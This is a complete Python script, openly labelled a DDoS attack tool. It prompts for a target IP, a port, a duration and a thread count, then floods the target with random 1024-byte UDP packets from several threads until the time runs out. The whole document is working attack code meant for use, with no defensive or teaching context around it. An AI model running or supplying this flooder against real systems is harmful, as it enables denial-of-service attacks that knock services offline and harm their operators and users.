import socket
import random
import time
import threading

def ddos(target, port, duration):
    # Convert target to IP address
    target_ip = socket.gethostbyname(target)

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate random bytes for the payload
    payload = random._urandom(1024)

    # Start the attack
    start_time = time.time()
    while time.time() - start_time < duration:
        # Send packets to target
        s.sendto(payload, (target_ip, port))

    s.close()

def main():
    target = input("Enter target IP address: ")
    port = int(input("Enter target port: "))
    duration = int(input("Enter attack duration (in seconds): "))

    # Number of threads for concurrent attacks
    num_threads = int(input("Enter number of threads: "))

    # Start DDoS attack
    print(f"Attacking {target} on port {port} for {duration} seconds with {num_threads} threads...")
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=ddos, args=(target, port, duration))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("Attack finished.")

if __name__ == "__main__":
    main()
